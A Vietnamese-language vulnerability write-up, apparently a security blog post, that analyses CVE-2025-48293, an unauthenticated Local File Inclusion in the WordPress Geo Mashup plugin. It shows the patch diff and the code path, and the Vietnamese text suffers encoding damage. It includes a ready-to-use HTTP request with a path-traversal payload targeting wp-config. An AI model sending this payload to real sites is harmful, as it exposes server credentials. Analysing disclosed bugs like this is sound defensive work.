# CVE-2025-48293 Analysis & POC


<!--more-->

## CVE & Basic Info
Plugin **Geo Mashup** phi√™n b·∫£n **‚â§ 1.13.16** ch·ª©a l·ªó h·ªïng **Local File Inclusion** cho ph√©p k·∫ª t·∫•n c√¥ng kh√¥ng c·∫ßn x√°c th·ª±c ƒëi·ªÅu khi·ªÉn tham s·ªë file trong l·ªánh `include/require`, t·ª´ ƒë√≥ ch√®n ho·∫∑c ƒë·ªçc c√°c t·ªáp c·ª•c b·ªô tr√™n m√°y ch·ªß (v√≠ d·ª• file c·∫•u h√¨nh ch·ª©a credential), d·∫´n t·ªõi r√≤ r·ªâ th√¥ng tin nh·∫°y c·∫£m v√† trong m·ªôt s·ªë c·∫•u h√¨nh c√≥ th·ªÉ d·∫´n t·ªõi th·ª±c thi m√£.

* **CVE ID**: [CVE-2025-48293](https://www.cve.org/CVERecord?id=CVE-2025-48293)
* **Vulnerability Type**: Local File Inclusion
* **Affected Versions**: <= 1.13.16
* **Patched Versions**: 1.13.17
* **CVSS severity**: High (9.8)
* **Required Privilege**: Unauthenticated
* **Product**: [WordPress Geo Mashup Plugin](https://wordpress.org/plugins/geo-mashup/)

## Requirements
* **Local WordPress & Debugging**: [Local WordPress and Debugging](https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/).
* **Plugin versions** - **Geo Mashup**: **1.13.16** (vulnerable) v√† **1.13.17** (patched).
* **Diff tool** - [**Meld**](https://meldmerge.org/) ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n.

## Analysis

### Patch diff

**B·∫£n l·ªói**:

```php {filename="geo-query.php v1.13.16" hl_lines=[2]}
public static function generate_object_html( ) {
    $template_base = ( isset( $_GET['template'] ) ) ? $_GET['template'] : '';
    // other logc
    load_template( GeoMashup::locate_template( $template_base ) );
}
```

`$template_base` ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ `$_GET['template']` **kh√¥ng qua b·∫•t k·ª≥ ki·ªÉm tra/sanitize n√†o**.

K·∫øt qu·∫£ ƒë∆∞·ª£c truy·ªÅn v√†o `GeoMashup::locate_template()` r·ªìi d√πng [`load_template()`](https://developer.wordpress.org/reference/functions/load_template/) - kh·∫£ nƒÉng k·∫ª t·∫•n c√¥ng ki·ªÉm so√°t ƒë∆∞·ªùng d·∫´n file ƒë·ªÉ include.

**B·∫£n v√°**:

```php {filename="geo-query.php v1.13.17" hl_lines=[2]}
public static function generate_object_html( ) {
    $template_base = ( isset( $_GET['template'] ) ) ? sanitize_key($_GET['template']) : '';
    // other logic
    load_template( GeoMashup::locate_template( $template_base ) );
}
```

[`sanitize_key()`](https://developer.wordpress.org/reference/functions/sanitize_key/) ƒë∆∞·ª£c √°p d·ª•ng cho `template` => lo·∫°i b·ªè c√°c k√Ω t·ª± kh√¥ng an to√†n, ngƒÉn `../`, `\`, v√† c√°c k√Ω t·ª± ƒë·∫∑c bi·ªát l√†m gi·∫£m nguy c∆° **path traversal** v√† **LFI** t·ª´ tham s·ªë `template`.

### Vulnerable Code 
Ta ph√¢n t√≠ch logic trong `GeoMashup::locate_template()` c√≥ ·∫£nh h∆∞·ªüng g√¨ ƒë·∫øn `$template_base`

```php {filename="geo-mashup.php v1.13.16" hl_lines=[3,10,11,12]}
public static function locate_template( $template_base ) {
    $template = locate_template( array("geo-mashup-$template_base.php") );
 
    if ( empty( $template ) || !is_readable( $template ) ) {
        $template = path_join( GEO_MASHUP_DIR_PATH, "default-templates/$template_base.php" );
    }
    return $template;
}
```

`$template` ƒë∆∞·ª£c g√°n l·∫°i gi√° tr·ªã b·∫±ng c√°ch g·ªçi `locate_template()` thu·ªôc file **template.php** v·ªõi ƒë·ªëi s·ªë `geo-mashup-$template_base.php`

```php {filename="template.php v1.13.16" hl_lines=[]}
function locate_template( $template_names, $load = false, $load_once = true, $args = array() ) {
	global $wp_stylesheet_path, $wp_template_path;

	if ( ! isset( $wp_stylesheet_path ) || ! isset( $wp_template_path ) ) {
		wp_set_template_globals();
	}

	$is_child_theme = is_child_theme();

	$located = '';
	foreach ( (array) $template_names as $template_name ) {
		if ( ! $template_name ) {
			continue;
		}
		if ( file_exists( $wp_stylesheet_path . '/' . $template_name ) ) {
			$located = $wp_stylesheet_path . '/' . $template_name;
			break;
		} elseif ( $is_child_theme && file_exists( $wp_template_path . '/' . $template_name ) ) {
			$located = $wp_template_path . '/' . $template_name;
			break;
		} elseif ( file_exists( ABSPATH . WPINC . '/theme-compat/' . $template_name ) ) {
			$located = ABSPATH . WPINC . '/theme-compat/' . $template_name;
			break;
		}
	}

	if ( $load && '' !== $located ) {
		load_template( $located, $load_once, $args );
	}

	return $located;
}
```

C√°c logic li√™n quan ƒë·∫øn s·ª± t·ªìn t·∫°i c·ªßa file khi concat v·ªõi `$template_name` ƒë∆∞·ª£c x·ª≠ l√Ω, n·∫øu kh√¥ng t·ªìn t·∫°i th√¨ tr·∫£ v·ªÅ chu·ªói r·ªóng `''`

{{< figure src="debug1.png" caption="C√°c logic li√™n quan ƒë·∫øn s·ª± t·ªìn t·∫°i c·ªßa file" >}}

Khi attack g·ª≠i `$_GET['template']` ch·ª©a `../` th√¨ m·∫∑c ƒë·ªãnh file lu√¥n kh√¥ng t·ªìn t·∫°i, lu√¥n tr·∫£ v·ªÅ `''`

Quay tr·ªü l·∫°i `GeoMashup::locate_template()`, khi `$template_name` empty v√† kh√¥ng t·ªìn t·∫°i (`!is_readable($template)`) th√¨ ƒë∆∞·ª£c g√°n l·∫°i gi√° tr·ªã v√† tr·∫£ v·ªÅ.

```php
const string GEO_MASHUP_DIR_PATH = "/srv/www/wordpress/wp-content/plugins/geo-mashup"

GEO_MASHUP_DIR_PATH.default-templates/$template_base.php
```

üëâ `GeoMashup::locate_template()` kh√¥ng ·∫£nh h∆∞·ªüng ƒë·∫øn `$template_base` do ta ki·ªÉm so√°t, ta ti·∫øn h√†nh t√¨m c√°ch k√≠ch ho·∫°t s·ª± ki·ªán n√†y

```php {filename="geo-query.php v1.13.17" hl_lines=[4]}
if ( ( isset( $_GET['output'] ) and 'json' == $_GET['output'] ) or empty( $_GET['object_ids'] ) ) {
	GeoMashupQuery::generate_location_json( );
} else {
	GeoMashupQuery::generate_object_html( );
}
```

`generate_object_html()` ch·ªâ ƒë∆∞·ª£c g·ªçi khi `$_GET['output']` kh√¥ng ƒë∆∞·ª£c truy·ªÅn v√† `$_GET['object_ids']` kh√¥ng empty.

**geo-query.php** ch·ª©a logic tr√™n ƒë∆∞·ª£c g·ªçi trong **geo-mashup.php**

{{< figure src="search1.png" caption="**geo-query.php** ƒë∆∞·ª£c g·ªçi trong **geo-mashup.php**" >}}

H√†m `geo_query` l√† callback c·ªßa action hook **Unauthenticated**

```php
add_action( 'wp_ajax_nopriv_geo_mashup_query', array( __CLASS__, 'geo_query') );
```

Khi truy c·∫≠p endpoint `/wp-admin/admin-ajax.php` v·ªõi param `action=geo_mashup_query` th√¨ callback `geo_query` ƒë∆∞·ª£c g·ªçi.

## Exploit
### Proof of Concept (PoC)
1. Th√™m code v√†o `wp-config.php` ƒë·ªÉ th·ª≠ nghi·ªám

```php
echo "Payload";
```

2. G·ª≠i **GET request** v·ªõi **LFI** payload

```http
GET /wp-admin/admin-ajax.php?action=geo_mashup_query&object_ids=2&template=../../../../wp-config HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: vi,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
X-PwnFox-Color: green
Priority: u=0, i
```

**Result**:

{{< figure src="result.png" caption="K·∫øt qu·∫£ LFI th√†nh c√¥ng" >}}

## Conclusion

CVE-2025-48293 l√† LFI do d√πng input `template` kh√¥ng ki·ªÉm so√°t khi gh√©p v√†o ƒë∆∞·ªùng d·∫´n fallback, cho ph√©p path traversal (`..`) v√† include file ngo√†i d·ª± ƒë·ªãnh. ƒê√£ v√° trong **v1.13.17** b·∫±ng `sanitize_key()`.

## Key takeaways

* Kh√¥ng d√πng input user tr·ª±c ti·∫øp ƒë·ªÉ build path cho include.
* D√πng **whitelist** ho·∫∑c `sanitize_key()` + `realpath()` ki·ªÉm tra.

## References

[File Inclusion/Path traversal ‚Äî Hacktrick](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=lfi#lfi--rfi-using-php-wrappers--protocols)

[ WordPress Geo Mashup Plugin <= 1.13.16 is vulnerable to Local File Inclusion ](https://patchstack.com/database/wordpress/plugin/geo-mashup/vulnerability/wordpress-geo-mashup-plugin-1-13-16-local-file-inclusion-vulnerability)


---

> T√°c gi·∫£: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/vi/posts/2025-10-13-cve-2025-48293/  

